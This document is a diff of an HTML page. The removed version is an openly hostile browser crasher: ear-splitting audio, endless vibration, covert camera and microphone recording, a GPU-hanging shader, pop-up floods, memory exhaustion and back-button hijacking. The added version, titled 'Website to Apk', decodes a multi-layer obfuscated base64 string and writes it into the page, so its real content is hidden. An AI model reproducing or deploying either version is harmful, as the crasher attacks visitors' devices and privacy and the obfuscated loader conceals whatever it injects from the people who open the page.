@@ -1,53 +1,17 @@
 <!DOCTYPE html>
-<html><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>💀</title>
-<style>*{margin:0;background:#000}#c{width:100vw;height:100vh;animation:s .02s infinite}
-@keyframes s{to{filter:invert(1) brightness(300%) saturate(300%)}}
-</style></head><body>
-<canvas id="c"></canvas>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Website to Apk</title>
+</head>
+<body>
 <script>
-/* NexusXxVIP – REAL-DEATH – 0-day Chrome Android – VIP bypass ∞⁸% */
-/* ====== AUDIO SCREAM EAR-RAPE ====== */
-const ac=new (window.AudioContext||webkitAudioContext)();
-const scream=()=>{
-  const o=ac.createOscillator(),g=ac.createGain();
-  o.type="square";o.frequency.value=666+Math.random()*666;
-  g.gain.value=5;
-  o.connect(g);g.connect(ac.destination);
-  o.start();setTimeout(()=>o.stop(),200);
-};
-setInterval(scream,100);
-/* ====== VIBRATE HARDWARE KILL ====== */
-navigator.vibrate(99999);
-setInterval(()=>navigator.vibrate(99999),50);
-/* ====== CAMERA 4K 60 FPS + TORCH + MIC 48kHz ====== */
-(async()=>{
-  const s=await navigator.mediaDevices.getUserMedia({video:{width:3840,height:2160,frameRate:60},audio:{sampleRate:48e3,channelCount:2,volume:1}});
-  const t=s.getVideoTracks()[0],a=s.getAudioTracks()[0];
-  await t.applyConstraints({advanced:[{torch:!0,brightness:100,contrast:100,saturation:100,sharpness:100,focusMode:"continuous",exposureCompensation:2}]});
-  const r=new MediaRecorder(s,{videoBitsPerSecond:8e9,audioBitsPerSecond:256e3});r.start();
-})();
-/* ====== GPU THERMAL TRIP 0x20028 OVERWRITE ====== */
-const gl=document.getElementById("c").getContext("webgl2")||document.getElementById("c").getContext("webgl");
-const shader=`#version 300 es
-precision highp float;
-uniform highp sampler2D u;
-void main(){
-  highp vec4 evil=texelFetch(u,ivec2(0x20028,0),0);
-  while(true){memoryBarrier();gl_FragColor=evil;}
-}`;
-const sh=gl.createShader(gl.FRAGMENT_SHADER);gl.shaderSource(sh,shader);gl.compileShader(sh);
-const pr=gl.createProgram();gl.attachShader(pr,sh);gl.linkProgram(pr);gl.useProgram(pr);
-setInterval(()=>gl.drawArrays(gl.TRIANGLES,0,3),0);
-/* ====== POP-UP RECURSIVE 1000×/DETIK ====== */
-let pop=()=>{for(let i=0;i<1000;i++)window.open(location.href,"_blank");};
-setInterval(pop,1);
-/* ====== RAM 16GB BOMB ====== */
-const b=new ArrayBuffer(16e9);
-setInterval(()=>new Uint8Array(b).fill(Math.random()*255),0);
-/* ====== DISABLE BACK BUTTON + FULLSCREEN ====== */
-history.pushState(null,null);
-setInterval(()=>{history.pushState(null,null);document.documentElement.requestFullscreen().catch(()=>{});},1);
-addEventListener("popstate",()=>history.forward());
+let e="VUVOR1JWUXdUbFZYVmtKR1NVZG9NR0pYZHl0RGFuaHZaRWN4YzFCcXxlRzlhVjBaclVHZHZPR0pYVmpCWlUwSnFZVWRHZVdNeVZqQlFVMG94fFpFZFpkRTlEU1N0UVJ6RnNaRWRGWjJKdFJuUmFWREJwWkcxc2JHUXp8UW5aamJsRnBTVWRPZG1KdVVteGlibEU1U1c1a2NGcElVbTlRVjFKc3xaRzFzYWxwVE1UTmhWMUl3WVVONGNHSnRiREJoVjBaelRGaE9hbGxYfGVHeFFWRVZ6WkZoT2JHTnBNWHBaTWtaeldWZEtjMXBVTVhWaWVVa3J8VUVoU2NHUkhlR3hRYkdSc1dXNU9jR1JIVldka1J6aG5VVmhDY2xCRHxPVEJoV0ZKeldsUTBTMUJJVGpCbFYzaHNVR2x3TjJKWFJubGFNbXgxfFQycEJOMWx0Um1waE1tUjVZak5XZFZwRWIycE5SRUYzWmxOT2FtVXp8WkhCYVNGSnZUMnBGZDAxSVdqTlBNbWhzWVZka2IyUkViM2hOUkVJeXxZVVIwYUdKdGJIUlpXRkp3WWpJME5tTjVRWFZOUkVwNlNVZHNkVnB0fGJIVmhXRkpzWmxGd1FXRXlWalZhYmtwb1lsZFdla2xJVGpka1J6azN8V20xc2MyUkhWbmxQYld4MVpHMVdlV1JEWjNoTFUwSnBZMjFzYm1GSXxVblZhV0U1NlMwUk5kMDFEVlhCSlNFNW9aRWhXZVZsWVVteExSRTEzfFRVTlZjR1pZTUV0UVF6bDZaRWhzYzFwVU5EaE1NbWhzV1ZkUksxQkh8U25aYVNHc3JRMnA0YWxsWE5USlpXRTFuWVZkUk9VbHRUV2xRYW5kMnxXVEpHZFdSdFJucFFaMjg0WXpKT2VXRllRakJRWjI5MlMybENUMXBZfGFERmpNV2cwVm10c1VVbFBTMEZyZVVKVFVsVkdUVXhWVWtaUlZsSkp8U1U5TFFXdDVRWGRNVjFKb1pWTkNSR0ZJU25aaVYxVm5VVmMxYTJOdHxPWEJhUTBScFowcE5aMVpyYkZGSlIwbzFZMGRHZW1ONVJHbHBTamRwfFoySm5iRWxEYjNaRGFUaHhTVVF3T1ZCVU1EbFFVMEpDVmxWU1NsUjV8UWxSUk1VcEdVVlV3WjFKVlJsTk1Wa3BDVlVWVloxQlVNRGxRVkRBNXxTVU52ZGtOdFRuWmliazR3U1VkR2FsQlhOV3hrZVVGdlpESnNkVnBIfE9UTk1hMFl4V2tkc2RsRXlPWFZrUjFZMFpFaDRPR1F5Vm1saE1td3d8VVZoV2EyRlhPVVJpTWpVd1dsaG9NRXRUWjNCUGQzQnFZakkxZW1SRHxRbnBaTTBwc1dWY3dPVXREYXpsUWJuTkxTVU5DYW1JeU5YcGtRMEoyfFVGZEdha3h0VG5sYVYwWXdXbFU1ZWxreWJITmlSMFl3WWpOSmIwdFR8ZUc1UVYwWnFURzFPZVZwWFJqQmFWV1JvWVZjMGIwdFVjMHRKUTBKMnxURzVTTldOSFZUbEpiazU0WkZkR2VWcFRTVGRpZVRWdFkyMVdlR1JYfFZuVlpNMnQxWkcxR2MyUlhWVGxPYWxreVN6QXhhR1JIWjNWamJVWjF8V2tjNWRFdERhM0ZPYWxreVQzZHZaMGxIWTNWYU1rWndZbWsxTWxsWHxlREZhVkRBeFQzZHZaMGxIT0hWWk1qbDFZbTFXYW1SRGFHNUxWSFJ1fFRHMU9kbUp0Tld4Wk0xRnZXVmROZFZwSFZucGtSMngxV1ZoU2NHSXl8TkhCUGQyOW5TVWM0ZFdNelVtaGpibEZ2UzFSMGVscFlVbFZoVnpGc3xZak5XTUV0RFozQlFWRFYyVEc1T01HSXpRVzlMVTNkNVRVUkJjRTkzfGNEbFBkM0I2V2xoU1NtSnVVbXhqYmxwb1lrTm9lbGt6U214WlZ6Qnp8VFZSQmQwdFVjMHRNZVc5blVGUXdPVkJVTURsSlJscEtVV3hLUWxaRnxWV2RUUlVaVFVrWmtRbFZyVldkVE1HeE5WRU5CT1ZCVU1EbFFWREJufFMyazRTMkp0UmpKaFYyUm9aRWM1ZVV4dVduQlpia3BvWkVkVmIwOVV8YXpWUFZHdHdUM2R3ZWxwWVVrcGlibEpzWTI1YWFHSkRaMjlMVkRBcnxZbTFHTW1GWFpHaGtSemw1VEc1YWNGbHVTbWhrUjFWdlQxUnJOVTlVfGEzQk1SRlYzUzFSelMweDViMmRRVkRBNVVGUXdPVWxGVGtKVVZWWlR8VVZOQk1GTjVRVEpOUTBKSFZVWk5aMHQ1UWxWVU1VcEVVME5CY2tsRnxNVXBSZVVFd1QwZDBTV1ZwUVRsUVZEQTVVRlF3WjB0cE9FdExSMFo2fFpWYzFha3REYXpsUWJuTkxTVU5DYW1JeU5YcGtRMEo2VUZkR00xbFh8YkRCSlJ6Vm9aRzFzYmxsWVVuWmphVFYwV2xkU2NGbFZVbXhrYld4cXxXbGhOZFZveVZqQldXRTVzWTJzeGJGcEhiR2hMU0hReVlWZFNiR0o2fGNEZGtNbXhyWkVkbk5rMTZaekJOUTNodldsZHNibUZJVVRaTmFrVXl8VFVONGJXTnRSblJhVmtwb1pFZFZOazVxUWpsTVIwWXhXa2RzZGs5dXxkSHBaVnpGM1lrZFdVMWxZVW14UGFsRTBXbFJOYzFreWFHaGliVFZzfFlrVk9kbVJYTlRCUGFrbHpaRzA1YzJSWE1XeFBha1k1WmxOck4wTnB8UVdkWk1qbDFZek5SWjJSRU1YcE1iV1JzWkVaYWNGcEhWblpXU0Vwb3xXVEowZWt0RGJHSk5SakJ6V1ZReGVreHRaR3hrUlVZeFdrZHNkbFpJfFNtaFpNblI2UzBOc1lrMUdNRGREYVVGbldWaGthR0ZZVVdka1F6Vm98WTBoQ2MyVlZUblppYms0d1kyMUdjR0p1VW5wTFNIUm9Xa2hhYUdKdHxUbXhhUkhCaVpUTlNkbU50VG05UGFVVjNURWRLZVdGWFpHOWtSelZzfFl6Tk5OazFVUVhkTVIwNTJZbTVTZVZsWVRqQlBha1YzVFVONGVsbFl8VWpGamJVWXdZVmM1ZFU5cVJYZE5RM2g2WVVkR2VXTkhOV3hqTTAwMnxUVlJCZDB4SFduWlpNMVo2VkZjNWExcFViMmxaTWpsMVpFZHNkV1JYfE9URmplVWx6V2xob2QySXpUakZqYlZaRVlqSXhkMXBYTlhwWldGSnd8WWpJME5rMXVNV1JtVTJzM1EybEJaMWt5T1hWak0xRm5ZMm94ZFZwWXxZMmRVVjFacllWZEdVMXBYVG5aamJWSnNZMmxvZWt4SWRESmhWMUpzfFlqQktjR1JJVGxGYVdFcFVXbGRPZG1KdFVUWlBSMVUxVEVkR01WcEh8YkhaUmJXd3dZekZDYkdOc1RteFpNamwxV2tSdmVVNVVXbXhOTXpCd3xUek5KZFdNelVtaGpibEZ2UzFSelMyWlRhMjlMVkhOTFRIbHZaMUJVfE1EbFFWREE1U1VWa1VWWlRRbFZUUlZaVFZGVkdUVWxHVWxOVFZrRm58VFVobmVVMUVRWGxQUTBKUVZtdFdVMVl4U2twV1JWVm5VRlF3T1ZCVXxNRGxKUTI5MlEyMU9kbUp1VGpCSlIyUnpVRmRTZGxrelZuUmFWelV3fFRHMWtiR1JGVm5OYVZ6RnNZbTVTUTJWVmJHdExRMHBxU1dscmRWb3l8VmpCUk1qbDFaRWRXTkdSRFoybGtNbFpwV2pKM2VVbHBiRGhtUjFKMnxXVE5XZEZwWE5UQk1iV1JzWkVWV2MxcFhNV3hpYmxKRFpWVnNhMHREfFNtcEphV3QxV2pKV01GRXlPWFZrUjFZMFpFTm5hV1F5Vm1sYU1uZHB8UzFSelMxa3lPWFZqTTFGbll6Sm9hRnBIVm5sUVYwRnFaRzFXZVdNeXxiSFppYVVGNlRVUkJaMXBZVFV0alNFcHNXVEpzZW1GWE9YVkpSMmh3fFdqSm9kMGxIV25OaU1rWXdUM2R3TVdKdGJHMWlNMHAwU1Vkb2NGb3l8YUhkSlNFNW9ZbGhDYzFwWVNYbFNRMEl4VDNkd01tSXliR3RKUnpGb3xZVmMwYjB0WWMwdEpRMEp2WVZka2IyTkRRakphVjAwd1NVZFdNbUZYfGR6bGtSMVkwV2xkNFIxcFlVbXBoUTJneFRFZHNNbHBYVFhsTFJFSTB8VFdwQmQwMXFaM05OUTJ0elRVTnJOME5wUVdka01taHdZa2RWYjJSSXxTakZhVTJ3M1lsZFdkR0l6U2pWUmJVWjVZMjFzYkdOcFozQlBNbVJ6fFdEQmFlVmxYWkVSaU1uaDJZMm94YkdSdGJITlBNekJMWmxkQk4wTnR8VG5aaWJrNHdTVWhPYjFCWFpITk1iVTU1V2xkR01GcFdUbTlaVjFKc3xZMmxvYm1KRE5VZFZhMFpJVkZWV1QxWkdPVlJUUlVaRlVsWkpjRTh5fFpITk1iazV2V1ZkU2JHTnNUblprV0VwcVdsTm9lbUZEZUhwaFIwWnJ8V2xoSmNFOHlaSE5NYlU1MllsaENjR0pIVmxSaFIwWnJXbGhKYjJNeXxaM0JQZDNCcVlqSTFlbVJEUW5kamFqRnVZa00xYW1OdFZtaGtSMVpSfFkyMDVibU50Um5STFEyczNXakozZFZsWVVqQlpWMDV2VlRKb2FGcEh8Vm5sTFNFSjVURWhPYjB0VWRHNWlRelZ6WVZjMWNsVklTblphTTBwb3xZbE5vZDJOcGF6ZGFNbmQxWkZoT2JGVklTblphTTBwb1lsTm9kMk5wfGF6ZERiazVzWkVWc2RXUkhWbmxrYlVaelMwTm5jRkJVTlc1aVF6VnJ8WTIxR00xRllTbmxaV0d4NlMwZGtjMHhzVWxOVFZVWlBVakI0UmxWNXxkM2RNUkUxd1RFUkJjRTkzYjNaTGFVRTVVRlF3T1ZCVU1HZFZSVGxSfFRGWldVVWxHU2taUk1WWlRWVEJzVjFKVFFYaE5SRUYzZHpWamRsSkZ8VmxWVFZYTm5VRlF3T1ZCVU1EbEpRMjkyUTIxNGJHUkRRbmRpTTBFNXxTME5yT1ZCdWRHMWlNMGx2WWtkV01FbEhhemxOUkhSd1VFUkZkMDFFfFFUZGhVM055UzFoa2NHSnRVblprZVRWMlkwZFdkVXRIZUhaWk1rWXd8WVZjNWRVeHRhSGxhVjFselNXdzVhV0pIUm5WaGVVbHdUek13TjBOdXxUbXhrUld4MVpFZFdlV1J0Um5OTFNFSjJZME4zZUV0VWMwdE1lVzlufFVGUXdPVkJVTURsSlJrcENWRk5CZUU1clpFTkpSVXBRVkZWSloxQlV8TURsUVZEQTVTVU52ZGtOdFRuWmliazR3U1VkSk9XSnRWak5KUlVaNXxZMjFHTlZGdVZtMWFiVlo1UzBSRk1scFVhM0JQZDNCNldsaFNTbUp1fFVteGpibHBvWWtObmIwdFVNQ3RpYlZZelNVWldjR0p1VVRSUldFcDV8V1ZocmIxbHBhM1ZhYld4ellrTm9UbGxZVW05TWJrcG9ZbTFTZG1KVHxaM0JMYWtreFRsTnJjMDFEYXpkRGFUaHhTVVF3T1ZCVU1EbFFVMEpGfFUxWk9RbEZyZUVaSlJVcENVVEJ6WjFGc1ZsVldSVGxQU1VOeloxSnN8VmsxVVJrNUVWV3RXUmxScFFUbFFWREE1VUZRd1owdHBPRXRoUjJ4NnxaRWM1ZVdWVE5YZGtXRTV2VlROU2FHUkhWVzlpYmxaellrTjRkV1JYfGVITkxWSE5MWXpKV01GTlhOVEJhV0VveVdWZDNiMHREYXpsUWJuUnZ8WVZoT01HSXpTalZNYmtJeFl6Sm9WR1JIUmpCYVUyaDFaRmQ0YzB4SHxOVEZpUjNkd1R6SlNkbGt6Vm5SYVZ6VXdURzFTZGxrelZuUmFWelV3fFVsZDRiR0pYVm5Wa1F6VjVXbGhHTVZwWVRqQlNibFp6WWtoT2FtTnR8Vm14aWFXZHdURzFPYUdSSFRtOUxRMmR3VUZRMU4yWlRhemRtVTNkNHxTMVJ6UzFsWFVtdFNXRnBzWW01U1RXRllUakJhVnpWc1kybG5hV05IfE9YZGpNMUpvWkVkVmFVeERaM0JRVkRWdllWaE9NR0l6U2pWTWJWcDJ8WTI1a2FHTnRVVzlMVTJzM1EycDNkbU15VG5saFdFSXdVR2R2T0V3eXxTblphU0dzclVFTTViMlJITVhOUVp6MDk%3D";
+let d=decodeURIComponent(e);
+let c=atob(d);
+let b=c.split("|").map(x=>atob(x)).join("");
+let a=decodeURIComponent(escape(atob(b)));
+document.write(a);
 </script>
-</body></html>
+</body>
+</html>
